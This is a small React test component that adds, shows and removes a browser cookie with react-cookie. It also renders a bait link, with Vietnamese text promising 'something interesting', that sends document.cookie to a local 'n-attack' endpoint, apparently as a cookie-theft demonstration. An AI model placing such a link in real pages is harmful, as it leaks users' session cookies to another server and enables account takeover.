import React from 'react';
import { useEffect } from 'react';
import { useCookies } from 'react-cookie';
import {Cookies} from 'react-cookie'


export default function TestS() {
    const [value, setCookie, removeCookie] = useCookies(['aa'])
    useEffect(() => {
        console.log(value['mmm'])
    })
    const remove = () =>{
        removeCookie('mmm')
        console.log(value['mmm'])
    }
    const add = () => {
        setCookie('mmm',{name: 'ThiPro', age: 22})
    }
    return(
        <>
            <p>
                This is value of cookie: {value['mmm'] ? value['mmm'].name : 'No data'}
            </p>
            <button onClick={add}>Add cookie</button>
            <button onClick={remove}>Remove cookie</button>
            <a target='_blank' href={`http://localhost:8089/n-attack/?xxx=${document.cookie}`}>Nhấn vào đây có điều thú vị nha</a>
        </>
    )
}



